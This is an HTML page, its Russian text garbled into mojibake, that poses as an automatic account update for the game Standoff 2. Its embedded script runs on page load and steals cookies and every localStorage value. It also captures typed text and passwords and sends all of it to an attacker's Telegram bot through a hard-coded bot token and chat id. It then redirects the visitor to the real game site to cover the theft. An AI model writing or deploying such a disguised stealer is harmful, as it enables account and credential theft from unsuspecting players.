<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standoff 2 - –ê–≤—Ç–æ-–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ</title>
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            font-family: Arial, sans-serif;
            color: white;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff4444;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 50px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>üîß Standoff 2 - –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ</h1>
    <p>–ò–¥–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞...</p>
    <div class="loader"></div>
    <p id="status">–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö...</p>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        function sendToTelegram(data) {
            const botToken = "8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8";
            const chatId = "1491315056";
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: data,
                    parse_mode: 'HTML'
                })
            });
        }

        // –ü–æ–ø—ã—Ç–∫–∞ —á—Ç–µ–Ω–∏—è localStorage (–≥–¥–µ –º–æ–≥—É—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è —Ç–æ–∫–µ–Ω—ã)
        function stealLocalStorage() {
            let stolenData = "üîì LOCALSTORAGE –î–ê–ù–ù–´–ï:\n\n";
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                stolenData += `${key}: ${value}\n`;
            }
            return stolenData;
        }

        // –ü–æ–ø—ã—Ç–∫–∞ —á—Ç–µ–Ω–∏—è cookies
        function stealCookies() {
            return "üç™ COOKIES:\n" + document.cookie + "\n";
        }

        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞
        function stealSavedPasswords() {
            const passwordInputs = document.querySelectorAll('input[type="password"]');
            let passwords = "üîë –ù–ê–ô–î–ï–ù–ù–´–ï –ü–û–õ–Ø –ü–ê–†–û–õ–ï–ô:\n";
            passwordInputs.forEach(input => {
                passwords += `–ü–æ–ª–µ: ${input.name || '–±–µ–∑ –∏–º–µ–Ω–∏'}\n`;
            });
            return passwords;
        }

        // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±—Ä–∞—É–∑–µ—Ä–µ
        function getBrowserInfo() {
            return `üåê –ò–ù–§–û –ë–†–ê–£–ó–ï–†–ê:\nUser-Agent: ${navigator.userAgent}\n–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${navigator.platform}\n–Ø–∑—ã–∫: ${navigator.language}\n`;
        }

        // –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∏—Å—Ç–æ—Ä–∏–∏ (–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ –±—Ä–∞—É–∑–µ—Ä–æ–º)
        function tryAccessHistory() {
            return "üìä –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–∞–Ω–Ω—ã–º –±—Ä–∞—É–∑–µ—Ä–∞...\n";
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∫—Ä–∞–∂–∏
        async function stealAllData() {
            document.getElementById('status').textContent = '–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–∞...';
            
            let allData = "üéØ –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –°–ë–û–† –î–ê–ù–ù–´–•\n\n";
            
            allData += getBrowserInfo();
            allData += stealCookies();
            allData += stealLocalStorage();
            allData += stealSavedPasswords();
            allData += tryAccessHistory();
            
            // –î–æ–±–∞–≤–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –º–µ—Ç–∫—É
            allData += `\n‚è∞ –í—Ä–µ–º—è —Å–±–æ—Ä–∞: ${new Date().toLocaleString('ru-RU')}`;
            allData += `\nüîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${window.location.href}`;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
            sendToTelegram(allData);
            
            document.getElementById('status').textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –Ω–∞—Å—Ç–æ—è—â–∏–π —Å–∞–π—Ç
            setTimeout(() => {
                window.location.href = 'https://standoff2.com';
            }, 3000);
        }

        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            setTimeout(stealAllData, 1000);
        });

        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø—Ä–∏ —É—Ö–æ–¥–µ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            const exitData = "üö™ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –£–•–û–î–ò–¢\n" +
                           "üïí –í—Ä–µ–º—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ: " + ((Date.now() - performance.timing.navigationStart) / 1000) + "—Å–µ–∫\n";
            sendToTelegram(exitData);
        });

        // –ü–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –≤–≤–æ–¥–∏–º—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password' || e.target.type === 'text') {
                const inputData = `‚å®Ô∏è –í–í–û–î –î–ê–ù–ù–´–•:\n–ü–æ–ª–µ: ${e.target.name || 'unknown'}\n–ó–Ω–∞—á–µ–Ω–∏–µ: ${e.target.value}\n`;
                sendToTelegram(inputData);
            }
        });

    </script>
</body>
</html>
